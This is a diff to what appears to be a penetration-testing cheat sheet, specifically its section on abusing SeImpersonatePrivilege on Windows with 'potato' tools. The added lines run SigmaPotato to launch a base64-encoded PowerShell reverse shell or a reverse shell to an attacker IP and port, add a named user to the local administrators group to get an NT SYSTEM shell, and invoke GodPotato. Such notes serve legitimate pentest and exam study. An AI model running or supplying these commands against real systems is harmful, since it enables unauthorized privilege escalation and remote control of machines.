@@ -15,13 +15,20 @@ searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep "4." | g
 
 ***
 
-## SeImpersonatePrivilege — SigmaPotato
+## SeImpersonatePrivilege - Potato Exploits
 
 Commonly found when exploiting IIS or other Windows services (LocalService, NetworkService, ApplicationPoolIdentity).
 
 ```bash
-wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
-.\SigmaPotato.exe "<command>"
+# Execute a reverse shell 
+.\SigmaPotato.exe "powershell -e <base64-reverse-shell>"
+# Other way to do it 
+.\SigmaPotato.exe --revshell <attacker-ip> <attacker-port>
+# If this fails we can always add a user to admins and psexec (will give NT SYSTEM shell)
+.\SigmaPotato.exe "net localgroup administrators Eric.Wallows /add"
+
+# In some situations GodPotato-NET4.exe can also me used as follows
+.\GodPotato-NET4.exe 
 ```
 
 ***
